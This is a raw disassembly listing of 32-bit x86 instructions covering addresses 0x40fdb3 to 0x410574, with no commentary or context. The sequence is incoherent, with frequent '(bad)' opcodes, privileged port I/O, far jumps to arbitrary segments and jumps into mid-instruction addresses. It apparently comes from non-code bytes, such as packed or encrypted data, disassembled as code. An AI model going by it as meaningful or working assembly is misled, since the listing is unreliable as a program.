  40fdb3:	or     DWORD PTR fs:[esi+ecx*1],0x9ae25099
  40fdbb:	aaa    
  40fdbc:	jno    0x40fdc3
  40fdbe:	shr    BYTE PTR [edx+0x817cb93],cl
  40fdc4:	je     0x40fd57
  40fdc6:	nop
  40fdc7:	xchg   ebx,eax
  40fdc8:	push   edi
  40fdc9:	sub    bl,BYTE PTR [ebx+edi*1-0x30]
  40fdcd:	mov    dl,0x4f
  40fdcf:	push   eax
  40fdd0:	shl    DWORD PTR [edx-0x2f],0x1
  40fdd4:	or     eax,0x414f752d
  40fdd9:	sbb    bl,BYTE PTR [ecx]
  40fddb:	mov    eax,ds:0xcad7d0a5
  40fde0:	iret   
  40fde1:	mov    bh,0xad
  40fde3:	gs xchg esp,eax
  40fde5:	les    ecx,FWORD PTR [edi-0x44ccf67d]
  40fdeb:	ins    BYTE PTR es:[edi],dx
  40fdec:	bt     edx,ebx
  40fdef:	xchg   BYTE PTR [esi],bl
  40fdf1:	fld    QWORD PTR [ecx-0x6c1b9768]
  40fdf7:	std    
  40fdf8:	add    al,0x82
  40fdfa:	mov    ds:0x47132dfc,eax
  40fdff:	push   esp
  40fe00:	jb     0x40fdbb
  40fe02:	inc    ecx
  40fe03:	or     dl,ch
  40fe05:	(bad)  
  40fe06:	fidiv  WORD PTR [eax-0x629daaed]
  40fe0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe0d:	xchg   ecx,eax
  40fe0e:	shl    DWORD PTR ds:0x724e4017,0xff
  40fe15:	imul   DWORD PTR [eax+0x53a7f964]
  40fe1b:	add    al,0x7b
  40fe1d:	cmp    bh,al
  40fe1f:	mov    dh,0xbe
  40fe21:	xchg   edi,eax
  40fe22:	imul   esi,DWORD PTR [ecx+edx*1],0xf3ccf2d3
  40fe29:	ret    
  40fe2a:	add    ebx,0x6086126a
  40fe30:	fcmovb st,st(0)
  40fe32:	test   al,0xce
  40fe34:	mov    ds:0x2f2c0ef4,eax
  40fe39:	stos   DWORD PTR es:[edi],eax
  40fe3a:	adc    bl,BYTE PTR [esi]
  40fe3c:	jmp    0x9d63967b
  40fe41:	adc    ebx,edx
  40fe43:	cmp    BYTE PTR [edi],dl
  40fe45:	xor    ebp,DWORD PTR [eax-0x18]
  40fe48:	add    al,0xea
  40fe4a:	lea    ecx,[edx+edx*4-0x58]
  40fe4e:	xor    DWORD PTR [ebx+0x95fa299],0xffffffed
  40fe55:	call   0xccf7:0x12fbde11
  40fe5c:	mov    cl,0x92
  40fe5e:	add    BYTE PTR [ecx+ecx*1],ch
  40fe61:	push   0xf9e20ded
  40fe66:	outs   dx,DWORD PTR ds:[esi]
  40fe67:	sub    eax,0xd142b6be
  40fe6c:	mov    ds:0x8d08496,eax
  40fe71:	nop
  40fe72:	add    ch,ah
  40fe74:	fs dec ebx
  40fe76:	fwait
  40fe77:	retf   0xa3df
  40fe7a:	mov    WORD PTR [edi+0x1b5330f3],cs
  40fe80:	clc    
  40fe81:	mov    eax,ds:0x6896193c
  40fe86:	fisttp DWORD PTR [edx+0x31]
  40fe89:	sar    BYTE PTR [ecx-0x498ae273],1
  40fe8f:	in     al,dx
  40fe90:	push   ebp
  40fe91:	fsubr  DWORD PTR [edi+ebx*4]
  40fe94:	into   
  40fe95:	clc    
  40fe96:	adc    al,0xc7
  40fe98:	mov    BYTE PTR [eax],al
  40fe9a:	(bad)  
  40fe9c:	clc    
  40fe9d:	cmp    edi,DWORD PTR [esi*1+0x561a638c]
  40fea4:	es and eax,0x79013358
  40feaa:	or     bh,BYTE PTR [ebp+0xc]
  40fead:	adc    DWORD PTR [ebx+0x2ae645e9],eax
  40feb3:	dec    ebp
  40feb4:	jecxz  0x40fe59
  40feb6:	or     al,0x0
  40feb8:	or     DWORD PTR ds:0x941253b8,ebp
  40febe:	xchg   ebx,eax
  40febf:	pop    es
  40fec0:	push   cs
  40fec1:	mov    ah,0x2c
  40fec3:	xchg   edi,eax
  40fec4:	call   0xb108:0xde91209
  40fecb:	rol    DWORD PTR [ebx-0x7ccc8a91],1
  40fed1:	aaa    
  40fed2:	inc    edx
  40fed3:	jge    0x40febc
  40fed5:	cdq    
  40fed6:	jmp    0xad91e2bc
  40fedb:	sub    eax,0xef429650
  40fee0:	add    al,0xf4
  40fee2:	loopne 0x40ff49
  40fee4:	ret    0xd9e9
  40fee7:	sub    ah,bl
  40fee9:	daa    
  40feea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feeb:	dec    ecx
  40feec:	jae    0x40fe72
  40feee:	(bad)  
  40feef:	in     al,dx
  40fef0:	fstp   DWORD PTR [ecx]
  40fef2:	inc    ecx
  40fef3:	pop    edx
  40fef4:	ror    ah,0xa8
  40fef7:	jnp    0x40fea9
  40fef9:	retf   
  40fefa:	xor    BYTE PTR [ebp+esi*8-0x864d1ed],dh
  40ff01:	cld    
  40ff02:	imul   ebx,eax,0x58
  40ff05:	imul   edx,DWORD PTR [esi*4-0x301a2827],0x51
  40ff0d:	add    bh,BYTE PTR [edi-0x5130922d]
  40ff13:	addr16 (bad) 
  40ff15:	(bad)  
  40ff16:	sub    eax,DWORD PTR [eax+0x4a]
  40ff19:	pop    es
  40ff1a:	cmp    BYTE PTR [edx-0x6f6b5c24],al
  40ff20:	dec    edi
  40ff21:	daa    
  40ff22:	in     al,0x81
  40ff24:	outs   dx,DWORD PTR ds:[esi]
  40ff25:	loop   0x40ff57
  40ff27:	idiv   DWORD PTR [ebx]
  40ff29:	cli    
  40ff2a:	xlat   BYTE PTR ds:[ebx]
  40ff2b:	mov    ebp,0x573d06c3
  40ff30:	add    bh,BYTE PTR [edx+esi*4-0xc]
  40ff34:	hlt    
  40ff35:	int3   
  40ff36:	mov    bl,0x3
  40ff38:	or     BYTE PTR [esi+0x14],ah
  40ff3b:	jmp    0x40ff91
  40ff3d:	jg     0x40fef0
  40ff3f:	xchg   ebx,eax
  40ff40:	add    bl,cl
  40ff42:	(bad)  
  40ff43:	adc    ah,BYTE PTR [ecx-0x75d14f90]
  40ff49:	das    
  40ff4a:	ss pop esi
  40ff4c:	popa   
  40ff4d:	mov    bh,0xb3
  40ff4f:	xchg   edi,eax
  40ff50:	ds ret 0x7c60
  40ff54:	loope  0x40ffb2
  40ff56:	xchg   esp,eax
  40ff57:	inc    DWORD PTR [ecx]
  40ff59:	cmp    eax,0x473db3c3
  40ff5e:	cwde   
  40ff5f:	test   al,0x1f
  40ff61:	or     al,0x16
  40ff63:	(bad)  
  40ff65:	std    
  40ff66:	(bad)  
  40ff67:	cmp    BYTE PTR [ebp+0x3b],al
  40ff6a:	sti    
  40ff6b:	sbb    eax,0x93391930
  40ff70:	adc    BYTE PTR [esi+edi*1-0x29],ch
  40ff74:	add    esi,0x8793fbc3
  40ff7a:	push   cs
  40ff7b:	lds    eax,FWORD PTR [ecx+edx*4-0x4]
  40ff7f:	outs   dx,DWORD PTR ds:[esi]
  40ff80:	xchg   ecx,eax
  40ff81:	or     al,0x76
  40ff83:	popf   
  40ff84:	into   
  40ff85:	cmp    ch,dh
  40ff87:	add    esp,edx
  40ff89:	ins    DWORD PTR es:[edi],dx
  40ff8a:	popf   
  40ff8b:	cli    
  40ff8c:	and    bl,al
  40ff8e:	dec    esp
  40ff8f:	sub    edx,DWORD PTR [edx-0x230ba86d]
  40ff95:	ja     0x40ffb3
  40ff97:	retf   0x95b3
  40ff9a:	dec    edx
  40ff9b:	adc    BYTE PTR [ecx-0x79d4977e],0x7b
  40ffa2:	jae    0x40ff74
  40ffa4:	mov    ds:0x31d7a01,eax
  40ffa9:	xor    al,0xbf
  40ffab:	jmp    0xe7ae:0x32f57843
  40ffb2:	test   BYTE PTR [esi+0x4e],0xa9
  40ffb6:	daa    
  40ffb7:	iret   
  40ffb8:	ins    DWORD PTR es:[edi],dx
  40ffb9:	add    BYTE PTR [ebx-0x7d],0xe6
  40ffbd:	xor    ch,BYTE PTR [ebx-0xfa214e0]
  40ffc3:	in     eax,0x1e
  40ffc5:	in     al,0x2f
  40ffc7:	add    ch,BYTE PTR [esi+0x5b3af68a]
  40ffcd:	imul   ebp,DWORD PTR [ecx+edi*1+0x499a8823],0x488803a1
  40ffd8:	pop    es
  40ffd9:	stos   BYTE PTR es:[edi],al
  40ffda:	inc    edx
  40ffdb:	xchg   esi,eax
  40ffdc:	xchg   edx,eax
  40ffdd:	adc    DWORD PTR [edx],ebp
  40ffdf:	sbb    dh,ch
  40ffe1:	lock and al,0x27
  40ffe4:	add    DWORD PTR [edi-0x48],ebp
  40ffe7:	push   ds
  40ffe8:	iret   
  40ffe9:	xor    ch,BYTE PTR [esi+0x2f]
  40ffec:	(bad)  
  40ffee:	sbb    bh,BYTE PTR [edi]
  40fff0:	std    
  40fff1:	popf   
  40fff2:	stos   DWORD PTR es:[edi],eax
  40fff3:	pushf  
  40fff4:	ja     0x40ff9b
  40fff6:	es xchg ebp,eax
  40fff8:	lds    ecx,FWORD PTR [ebx*1+0x1a0b9d0d]
  40ffff:	sar    ebp,cl
  410001:	fldz   
  410003:	clc    
  410004:	or     bl,BYTE PTR [ebx-0x56]
  410007:	mov    al,0x2f
  410009:	push   ecx
  41000a:	test   eax,0x469759b9
  41000f:	inc    eax
  410010:	ficomp WORD PTR [eax-0x7a9b642b]
  410016:	sbb    BYTE PTR [edi],0xd8
  410019:	sbb    al,0x95
  41001b:	stc    
  41001c:	adc    al,0xd8
  41001e:	(bad)  
  41001f:	push   ecx
  410020:	lahf   
  410021:	inc    ecx
  410022:	xchg   edi,eax
  410024:	push   0x63
  410026:	adc    ch,BYTE PTR [esi]
  410028:	repz js 0x40ffb6
  41002b:	shl    ecx,0xb3
  41002e:	sbb    edi,DWORD PTR [edi-0x5d]
  410031:	stos   DWORD PTR es:[edi],eax
  410032:	lods   al,BYTE PTR ds:[esi]
  410033:	mov    esi,0x4ad41e28
  410038:	inc    ebp
  410039:	add    al,0x50
  41003b:	cmp    DWORD PTR [esi],ecx
  41003d:	xor    bl,BYTE PTR [edi-0x7e0834ea]
  410043:	jmp    0x41002c
  410045:	mov    ah,0xd7
  410047:	retf   
  410048:	pop    ss
  410049:	mov    dh,0xb7
  41004b:	pop    esi
  41004c:	jmp    0x48cd2c20
  410051:	rcr    BYTE PTR [esi+eiz*8-0x67d71852],1
  410058:	les    esi,FWORD PTR [edi-0x6eb90042]
  41005e:	cmp    eax,esi
  410060:	jo     0x40ffe4
  410062:	fild   DWORD PTR [esi-0x5a]
  410065:	sbb    BYTE PTR [ecx-0x22222a7d],cl
  41006b:	jo     0x4100ac
  41006d:	adc    eax,0xc67f9815
  410072:	repz adc esi,DWORD PTR [ecx]
  410075:	adc    dl,BYTE PTR [edi]
  410077:	rcl    BYTE PTR [edi*1-0x26ce4b3e],1
  41007e:	inc    edx
  41007f:	loop   0x4100ba
  410081:	sbb    eax,0xb98db956
  410086:	icebp  
  410087:	xchg   edi,eax
  410088:	lock push es
  41008a:	and    BYTE PTR [ebx-0x7f3ef529],dl
  410090:	scas   eax,DWORD PTR es:[edi]
  410091:	push   ebx
  410092:	test   BYTE PTR [edi],cl
  410094:	sub    DWORD PTR [esi],edi
  410096:	loop   0x4100b1
  410098:	push   ebx
  410099:	ret    0x8842
  41009c:	and    ebx,0x5bc35d85
  4100a2:	push   es
  4100a3:	out    0xbc,al
  4100a5:	jl     0x4100f0
  4100a7:	sub    eax,0xbf113661
  4100ac:	sub    BYTE PTR [ecx+ecx*4+0x7c9224fe],bh
  4100b3:	(bad)  
  4100b4:	mov    esp,0xcc58ec32
  4100b9:	pusha  
  4100ba:	fsub   QWORD PTR [ebx+ebx*2]
  4100bd:	out    0xe1,eax
  4100bf:	sbb    ebp,DWORD PTR [esi+0x5c]
  4100c2:	mov    cl,dl
  4100c4:	sar    BYTE PTR [edi],0x67
  4100c7:	adc    eax,0xbffb1728
  4100cc:	jnp    0x4100a5
  4100ce:	pop    es
  4100cf:	jle    0x4100f4
  4100d1:	add    esp,DWORD PTR [bp-0x45ae]
  4100d6:	iret   
  4100d7:	add    BYTE PTR [ecx],dl
  4100d9:	fnstcw WORD PTR [eax+0x74]
  4100dc:	xor    eax,0xb5cfbc53
  4100e1:	cmp    BYTE PTR [ebx-0x75bd0910],bl
  4100e7:	mov    ds:0x6a6dd5fb,eax
  4100ec:	jle    0x410146
  4100ee:	lea    ecx,[ecx-0x32]
  4100f1:	and    eax,edx
  4100f3:	mov    cs,WORD PTR [edx-0x63285ed2]
  4100f9:	pop    es
  4100fa:	inc    edx
  4100fb:	enter  0xc209,0x7c
  4100ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410100:	mov    eax,DWORD PTR [edx]
  410102:	mov    esp,0x1a3b7d32
  410107:	xchg   ebp,eax
  410108:	jno    0x410094
  41010a:	inc    ebp
  41010b:	aam    0xdb
  41010d:	pop    es
  41010e:	jne    0x410134
  410110:	mov    esi,0xe2e4742a
  410115:	ja     0x4100b9
  410117:	sub    BYTE PTR [esi-0x64391129],cl
  41011d:	arpl   WORD PTR [ebp+0x5b],sp
  410120:	and    al,0xdb
  410122:	stos   BYTE PTR es:[edi],al
  410123:	popa   
  410124:	jo     0x410176
  410126:	pop    ebx
  410127:	stos   DWORD PTR es:[edi],eax
  410128:	gs pop ds
  41012a:	mov    dh,0xaa
  41012c:	jecxz  0x41018f
  41012e:	xchg   BYTE PTR [ecx+0x70d30e7c],ch
  410134:	ret    0x4aeb
  410137:	sbb    BYTE PTR [eax],ah
  410139:	addr16 push es
  41013b:	mov    BYTE PTR [ebp-0xd],ah
  41013e:	push   ss
  41013f:	xor    eax,0x7f0ab7cc
  410144:	test   cl,bh
  410146:	loopne 0x4101ad
  410148:	add    al,0xb3
  41014a:	add    eax,0xd3797582
  41014f:	arpl   WORD PTR [ebx-0x20],ax
  410152:	jmp    0x410187
  410154:	sub    al,BYTE PTR [edx]
  410156:	or     eax,DWORD PTR [ebx-0x3f]
  410159:	mov    ah,0x9e
  41015b:	xor    dh,BYTE PTR [eax-0x17]
  41015e:	add    eax,0x22624167
  410163:	xchg   edx,eax
  410164:	icebp  
  410165:	xchg   ecx,eax
  410166:	scas   al,BYTE PTR es:[edi]
  410167:	xchg   edi,eax
  410168:	dec    ebp
  410169:	inc    esp
  41016a:	jl     0x4100f9
  41016c:	jl     0x4101b0
  41016e:	sub    bl,BYTE PTR [ecx-0x11]
  410171:	rol    ecx,1
  410173:	jp     0x4101cf
  410175:	sub    al,0xcd
  410177:	pushf  
  410178:	or     BYTE PTR [edi+0x4a],ah
  41017b:	mov    dh,0x6f
  41017d:	dec    ebx
  41017e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41017f:	adc    BYTE PTR [esi+0x292a3542],bh
  410185:	arpl   WORD PTR ds:0xc96b94e,di
  41018b:	in     eax,0xdb
  41018d:	std    
  41018e:	(bad)  
  410191:	add    BYTE PTR [edi+0x7c],0xb1
  410195:	sub    esi,DWORD PTR [edi]
  410197:	in     eax,dx
  410198:	mov    bl,dl
  41019a:	ds ins BYTE PTR es:[edi],dx
  41019c:	jnp    0x410133
  41019e:	cdq    
  41019f:	inc    edi
  4101a0:	in     eax,0x33
  4101a2:	loope  0x410183
  4101a4:	mov    ebx,0xc8bec56e
  4101a9:	jmp    0x41018f
  4101ab:	popa   
  4101ac:	pop    edi
  4101ad:	fbld   TBYTE PTR [ecx+0x14]
  4101b0:	pop    ecx
  4101b1:	mov    edi,0x19123b35
  4101b6:	xor    al,0x3d
  4101b8:	jle    0x410177
  4101ba:	lds    edi,FWORD PTR [edi]
  4101bc:	dec    esp
  4101bd:	ret    0xd6c0
  4101c0:	jle    0x410182
  4101c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101c3:	sub    al,0x6
  4101c5:	or     al,0x2a
  4101c7:	mov    ecx,0xfd867b33
  4101cc:	lahf   
  4101cd:	or     ecx,ebx
  4101cf:	sub    al,0x50
  4101d1:	and    ah,BYTE PTR [edi-0x48174f1a]
  4101d7:	mov    ecx,0xe54a9d32
  4101dc:	cli    
  4101dd:	sbb    DWORD PTR [ebp-0x6d],eax
  4101e0:	jecxz  0x410239
  4101e2:	jmp    0xab84:0x275d83a7
  4101e9:	stc    
  4101ea:	and    eax,0x3a43266
  4101ef:	adc    BYTE PTR [edi],0xb3
  4101f2:	push   esi
  4101f3:	in     eax,dx
  4101f4:	mov    ds:0x446fc315,eax
  4101f9:	rcr    BYTE PTR [esi],cl
  4101fb:	push   ss
  4101fc:	dec    ebx
  4101fd:	pop    ds
  4101fe:	loopne 0x410199
  410200:	lds    ebx,FWORD PTR [ecx-0x1d230a18]
  410206:	dec    ebp
  410207:	push   cs
  410208:	mov    bl,0x93
  41020a:	mov    cl,0x0
  41020c:	mov    esp,DWORD PTR [esi]
  41020e:	(bad)  
  41020f:	cmp    eax,0xdcf58fc6
  410214:	inc    ebp
  410215:	xchg   ebx,eax
  410217:	outs   dx,DWORD PTR ds:[esi]
  410218:	mov    DWORD PTR [edx+eax*4-0x6],esp
  41021c:	in     al,0x5d
  41021e:	xchg   BYTE PTR [esi+0x30],bl
  410221:	xchg   ebx,eax
  410222:	inc    esi
  410223:	push   esp
  410224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410225:	mov    esi,0x4c146d69
  41022a:	inc    esp
  41022b:	aas    
  41022c:	icebp  
  41022d:	out    0xdc,al
  41022f:	xchg   ebp,eax
  410230:	and    eax,edi
  410232:	adc    BYTE PTR [ebp-0x6f0127c5],bh
  410238:	sub    eax,0x19968436
  41023d:	jbe    0x410251
  41023f:	mov    ch,0xfd
  410241:	push   DWORD PTR [ecx-0x596c9072]
  410247:	fld    DWORD PTR [edi+0x4]
  41024a:	out    dx,eax
  41024b:	mov    bl,0xe0
  41024d:	jnp    0x41027e
  41024f:	cmp    eax,0x94c7a739
  410254:	inc    ebp
  410255:	dec    edi
  410256:	mov    ebp,0x8d2bfce4
  41025b:	jns    0x410289
  41025d:	bnd jb 0x410204
  410260:	cmp    BYTE PTR [ecx-0xf941b0d],bh
  410266:	mov    WORD PTR fs:[edi-0x7c17a6d9],?
  41026d:	(bad)  
  41026e:	das    
  41026f:	popa   
  410270:	cmp    BYTE PTR [esi+0x5ecd67d5],dl
  410276:	ret    
  410277:	out    dx,al
  410278:	aaa    
  410279:	fcmovne st,st(3)
  41027b:	dec    eax
  41027c:	ja     0x41022c
  41027e:	cbw    
  410280:	enter  0x7f9a,0xcb
  410284:	add    BYTE PTR [eax],0xfb
  410287:	push   ecx
  410288:	test   eax,0x88d03e80
  41028d:	dec    eax
  41028e:	sbb    edi,eax
  410290:	pop    esi
  410291:	mov    edi,0xdfa97b35
  410296:	test   al,0x9f
  410298:	adc    BYTE PTR [edx+edx*1-0x5e795f80],ch
  41029f:	sub    al,0xfd
  4102a1:	test   DWORD PTR [ecx+ebp*4],0x2fb34101
  4102a8:	jp     0x4102c0
  4102aa:	inc    edx
  4102ab:	mov    dh,0x95
  4102ad:	mov    edi,0x5d8525c7
  4102b2:	jbe    0x410240
  4102b4:	push   ss
  4102b5:	in     eax,0x24
  4102b7:	fld    TBYTE PTR ds:0x8159fce8
  4102bd:	test   ch,dh
  4102bf:	push   esi
  4102c0:	cs fs mov esp,0x16030258
  4102c7:	mov    bl,0x7c
  4102c9:	sti    
  4102ca:	jne    0x4102f9
  4102cc:	cmp    eax,0x78869220
  4102d1:	push   ebx
  4102d2:	add    al,0x2d
  4102d4:	jno    0x4102d1
  4102d6:	cli    
  4102d7:	outs   dx,DWORD PTR ds:[esi]
  4102d8:	xchg   ebx,eax
  4102d9:	cwde   
  4102da:	aam    0x4
  4102dc:	inc    ecx
  4102dd:	push   ecx
  4102de:	shr    esi,1
  4102e0:	fdivr  st(6),st
  4102e2:	fsubr  st,st(3)
  4102e4:	xlat   BYTE PTR ds:[ebx]
  4102e5:	fst    QWORD PTR [esi]
  4102e7:	dec    ebx
  4102e8:	std    
  4102e9:	push   ebp
  4102ea:	imul   eax,DWORD PTR [edi+0x137c27f9],0xffffffcb
  4102f1:	and    bl,dl
  4102f3:	cld    
  4102f4:	xchg   ebx,eax
  4102f5:	lock inc ebp
  4102f7:	ficomp WORD PTR [esi+0x57]
  4102fa:	push   esi
  4102fb:	data16 jecxz 0x410376
  4102fe:	sbb    eax,0x84749be1
  410303:	sub    DWORD PTR [ebp-0x7],0x7c7b1c8d
  41030a:	cli    
  41030b:	popa   
  41030c:	dec    edx
  41030d:	xchg   esp,eax
  41030e:	jns    0x410305
  410310:	sbb    eax,0xd91559a3
  410315:	aas    
  410316:	rol    BYTE PTR [ecx+0x47],0xdc
  41031a:	mov    ah,0x5e
  41031c:	loop   0x4102f7
  41031e:	cmp    ebp,DWORD PTR [edi-0x68]
  410321:	cmp    al,0x31
  410323:	fwait
  410324:	pop    esp
  410325:	push   0x7c
  410327:	cmp    DWORD PTR [edi-0x67],eax
  41032a:	xchg   edx,eax
  41032b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41032c:	mov    edi,0x578766e3
  410331:	xlat   BYTE PTR ds:[ebx]
  410332:	pop    esp
  410333:	das    
  410334:	push   edx
  410335:	aam    0x5
  410337:	add    eax,0x60cc72e0
  41033c:	nop
  41033d:	mov    esp,0xc17e717
  410342:	and    al,0xec
  410344:	push   esp
  410345:	and    ebp,DWORD PTR [eax+0x53]
  410348:	retf   0xa060
  41034b:	add    BYTE PTR [ebx-0x4f0e98ca],ah
  410351:	pop    ebx
  410352:	retf   0xa6b9
  410355:	clc    
  410356:	sahf   
  410357:	(bad)
  41035c:	push   ebx
  41035d:	mov    cl,0x11
  41035f:	and    ah,bl
  410361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410362:	inc    esi
  410363:	jb     0x41032f
  410365:	xchg   ebx,eax
  410366:	std    
  410367:	xchg   esi,eax
  410368:	mov    ebx,0x4a86d449
  41036d:	mov    ecx,0x75523da9
  410372:	addr16 cmp al,dh
  410375:	pop    ds
  410376:	(bad)  
  410377:	mov    eax,ds:0x9f83e2fb
  41037c:	xchg   esi,eax
  41037d:	push   0x0
  41037f:	aaa    
  410380:	mov    eax,0x1d77d968
  410385:	les    ecx,FWORD PTR [edi-0x34]
  410388:	pop    es
  410389:	mov    edx,0x3f967b85
  41038e:	inc    edx
  41038f:	loopne 0x410392
  410391:	push   esp
  410392:	pop    ebx
  410393:	adc    BYTE PTR [ecx],0x47
  410396:	dec    esp
  410397:	jne    0x410336
  410399:	mov    ch,0xa5
  41039b:	sti    
  41039c:	inc    ebp
  41039d:	in     eax,0x15
  41039f:	rol    ebx,0xc9
  4103a2:	aaa    
  4103a3:	enter  0xfc5b,0x53
  4103a7:	sbb    al,0xe4
  4103a9:	push   esp
  4103aa:	fwait
  4103ab:	das    
  4103ac:	sub    BYTE PTR [ebx-0x6f],ah
  4103af:	xchg   esi,eax
  4103b0:	and    DWORD PTR [ebp-0x7c],0x2c
  4103b4:	jbe    0x410433
  4103b6:	xchg   esi,eax
  4103b7:	shl    DWORD PTR [ebx-0x778b20d],0x9f
  4103be:	sub    al,0x25
  4103c0:	repnz aam 0x3e
  4103c3:	call   0xb4b98ffd
  4103c8:	dec    edi
  4103c9:	xchg   cl,bh
  4103cb:	aam    0x29
  4103cd:	push   edx
  4103ce:	push   ebp
  4103cf:	inc    esi
  4103d0:	xor    DWORD PTR [ebp-0x457743f],ebp
  4103d6:	xor    eax,0xb926f5c1
  4103db:	lods   al,BYTE PTR ds:[esi]
  4103dc:	jae    0x410414
  4103de:	outs   dx,BYTE PTR ds:[esi]
  4103df:	or     ebp,DWORD PTR [ecx+0x77e501c9]
  4103e5:	in     eax,0x19
  4103e7:	(bad)  
  4103e8:	xchg   edi,eax
  4103e9:	aas    
  4103ea:	mov    eax,ds:0x48ca2ce3
  4103ef:	mov    ebp,0xbc5afaac
  4103f4:	xor    cl,BYTE PTR [esp+ecx*2+0x4150a4a5]
  4103fb:	xor    eax,0xb1d87d27
  410400:	jl     0x410466
  410402:	add    BYTE PTR [edx+0x35fcc690],cl
  410408:	in     eax,0x87
  41040a:	loope  0x41041c
  41040c:	loop   0x410393
  41040e:	add    ch,BYTE PTR [eax-0x4b]
  410411:	test   al,0x55
  410413:	rcr    BYTE PTR [ebx],0xd8
  410416:	dec    edx
  410417:	jl     0x410417
  410419:	xlat   BYTE PTR ds:[ebx]
  41041a:	mov    edx,0x980ba656
  41041f:	lods   al,BYTE PTR ds:[esi]
  410420:	dec    esi
  410421:	mov    bh,0x30
  410423:	inc    ebx
  410424:	repz test eax,0x4245b300
  41042a:	jb     0x410491
  41042c:	inc    eax
  41042d:	pushf  
  41042e:	sub    DWORD PTR [edx+0x7f],ebp
  410431:	add    edx,DWORD PTR [esi]
  410433:	popa   
  410434:	in     al,dx
  410435:	ss call 0x8e90642b
  41043b:	cs scas eax,DWORD PTR es:[edi]
  41043d:	sbb    BYTE PTR [edi+0xeb1ba9b],0x4a
  410444:	or     ah,BYTE PTR [eax*1-0xf851bdd]
  41044b:	sub    al,BYTE PTR [ecx-0x7504dd34]
  410451:	mov    ds:0x45e78a6e,al
  410456:	jb     0x4104d2
  410458:	push   ss
  410459:	add    al,0x6e
  41045b:	add    edi,edx
  41045d:	aaa    
  41045e:	pop    ebp
  41045f:	in     eax,0xe6
  410461:	adc    bl,bl
  410463:	xor    ebx,edx
  410465:	mov    dh,BYTE PTR [ecx]
  410467:	outs   dx,DWORD PTR ds:[esi]
  410468:	and    eax,0xf6bf9772
  41046d:	add    DWORD PTR [edi-0x3144064c],ebx
  410473:	or     BYTE PTR [ebp+eiz*2+0x13],dh
  410477:	popa   
  410478:	mov    ecx,0x614145e3
  41047d:	daa    
  41047e:	repz mov ah,0x2c
  410481:	jnp    0x410477
  410483:	add    BYTE PTR [ebx],dh
  410485:	ficom  DWORD PTR cs:[edi+esi*1]
  410489:	arpl   WORD PTR [edx+esi*1-0x13dc3e1d],di
  410490:	std    
  410491:	sbb    eax,0xd390eb81
  410496:	dec    ebp
  410497:	cmp    al,0x2d
  410499:	sbb    ebp,esp
  41049b:	push   edx
  41049c:	dec    esp
  41049d:	out    0xf1,al
  41049f:	mov    edi,0x7c725c10
  4104a4:	push   bp
  4104a6:	cdq    
  4104a7:	pop    edx
  4104a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104a9:	std    
  4104aa:	and    al,0xd9
  4104ac:	imul   esi,DWORD PTR [ebx-0x786b568d],0x2bedd434
  4104b6:	aas    
  4104b7:	jne    0x41046d
  4104b9:	sar    al,1
  4104bb:	or     al,0xee
  4104bd:	mov    esi,0xc8f15d1
  4104c2:	or     ebx,ebp
  4104c4:	xchg   BYTE PTR [esi],dl
  4104c6:	les    ebp,FWORD PTR [edx]
  4104c8:	jno    0x4104fb
  4104ca:	mov    ss,WORD PTR [esi]
  4104cc:	fs pop ebp
  4104ce:	xchg   ebp,eax
  4104cf:	stos   BYTE PTR es:[edi],al
  4104d0:	test   eax,0x7a6f32a1
  4104d5:	lods   eax,DWORD PTR ds:[esi]
  4104d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104d7:	push   ds
  4104d8:	shr    BYTE PTR [eax+0x4],1
  4104db:	add    BYTE PTR cs:[eax*2-0x263f6494],cl
  4104e3:	and    ebp,DWORD PTR [ebp+eax*2-0x2df00c99]
  4104ea:	push   cs
  4104eb:	push   ebx
  4104ec:	ins    BYTE PTR es:[edi],dx
  4104ed:	iret   
  4104ee:	test   DWORD PTR [edi],ebp
  4104f0:	mov    dh,0x86
  4104f2:	sbb    al,0xae
  4104f4:	mov    edi,0x25874fcd
  4104f9:	pop    eax
  4104fa:	ret    
  4104fb:	out    dx,al
  4104fc:	mov    WORD PTR [esi],?
  4104fe:	dec    edi
  4104ff:	retf   0xcb8
  410502:	inc    ebx
  410503:	out    0xde,eax
  410505:	cmp    edx,edi
  410507:	xchg   ecx,eax
  410508:	out    0x39,al
  41050a:	out    0xcf,al
  41050c:	call   0x4a8619ad
  410511:	jne    0x4104ae
  410513:	ins    BYTE PTR es:[edi],dx
  410514:	ficomp DWORD PTR [edx]
  410516:	jnp    0x4104cf
  410518:	xor    edx,ebp
  41051a:	and    esi,ebp
  41051c:	inc    ebp
  41051d:	scas   al,BYTE PTR es:[edi]
  41051e:	dec    ecx
  41051f:	rol    dh,1
  410521:	jbe    0x41054a
  410523:	pop    esp
  410524:	jl     0x4104fb
  410526:	pop    esp
  410527:	retf   
  410528:	outs   dx,DWORD PTR ds:[esi]
  410529:	mov    al,ds:0x1e04ff2
  41052e:	fistp  QWORD PTR [edi+eax*2-0x25]
  410532:	scas   al,BYTE PTR es:[edi]
  410533:	fdivr  QWORD PTR [ebx+0x9]
  410536:	(bad)  
  410537:	aas    
  410538:	popa   
  410539:	sbb    al,0x5b
  41053b:	sti    
  41053c:	icebp  
  41053d:	mov    bh,0x1f
  41053f:	push   es
  410540:	test   BYTE PTR ds:0x1d578632,bl
  410546:	sbb    cl,BYTE PTR [ecx-0x13]
  410549:	stos   DWORD PTR es:[edi],eax
  41054a:	test   BYTE PTR [edi],0xf3
  41054d:	dec    ecx
  41054e:	jl     0x410581
  410550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410551:	dec    edx
  410552:	ins    DWORD PTR es:[edi],dx
  410553:	test   eax,0xe1e6edf9
  410558:	mov    al,ds:0xa772f87e
  41055d:	push   esp
  41055e:	sbb    eax,0x2e7bbfdd
  410563:	test   DWORD PTR [esi-0x68],ebx
  410566:	test   DWORD PTR ds:0xa84a2a81,edi
  41056c:	mov    eax,0x67f95bd
  410571:	pop    es
  410572:	aam    0xed
  410574:	and    ch,BYTE PTR [ebp-0x159e362c]
